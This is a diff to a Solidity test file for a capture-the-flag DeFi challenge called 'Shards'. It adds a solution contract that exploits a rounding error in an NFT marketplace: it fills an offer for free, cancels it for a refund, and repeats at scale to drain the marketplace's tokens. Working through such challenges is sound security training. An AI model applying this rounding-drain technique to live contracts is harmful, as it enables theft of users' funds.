@@ -48,8 +48,6 @@ contract ShardsChallenge is Test {
      */
     function setUp() public {
         startHoax(deployer);
-
-        // Deploy NFT contract and mint initial supply
         nft = new DamnValuableNFT();
         for (uint256 i = 0; i < NFT_SUPPLY; i++) {
             if (i < SELLER_NFT_BALANCE) {
@@ -114,7 +112,7 @@ contract ShardsChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_shards() public checkSolvedByPlayer {
-        
+        new ShardsExploit(marketplace, token, recovery);
     }
 
     /**
@@ -134,5 +132,25 @@ contract ShardsChallenge is Test {
 
         // Player must have executed a single transaction
         assertEq(vm.getNonce(player), 1);
+    }
+}
+
+contract ShardsExploit {
+    constructor(ShardsNFTMarketplace marketplace, DamnValuableToken token, address recovery) {
+        uint64 offerId = 1;
+
+        // First cycle: buy for free (rounding down to 0), then refund non-zero amount.
+        marketplace.fill(offerId, 100);
+        marketplace.cancel(offerId, 0);
+
+        token.approve(address(marketplace), type(uint256).max);
+
+        // Second cycle: scale up to drain almost all tokens from marketplace.
+        uint256 marketBalance = token.balanceOf(address(marketplace));
+        uint256 want = (marketBalance * 1e6) / marketplace.rate();
+        marketplace.fill(offerId, want);
+        marketplace.cancel(offerId, 1);
+
+        token.transfer(recovery, token.balanceOf(address(this)));
     }
 }
